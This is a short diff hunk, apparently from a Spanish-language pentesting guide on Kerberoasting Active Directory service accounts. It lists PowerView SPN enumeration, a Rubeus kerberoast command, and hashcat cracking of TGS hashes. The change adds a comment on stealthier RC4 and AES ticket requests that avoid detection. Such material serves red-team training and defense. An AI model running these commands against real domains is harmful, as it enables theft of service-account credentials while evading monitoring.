@@ -41,7 +41,7 @@ $ hashcat -m 19700 tgs.hash rockyou.txt      # AES-256
 
 ```powershell
 Get-DomainUser -SPN | select samaccountname   # PowerView, enumerar primero
-.\Rubeus.exe kerberoast /outfile:tgs.hash
+.\Rubeus.exe kerberoast /outfile:tgs.hash            # /rc4opsec: RC4 solo a cuentas sin AES (evita downgrade ruidoso); /aes: fuerza AES
 ```
 
 `Rubeus` enumera los SPN y solicita los tickets en un solo paso.
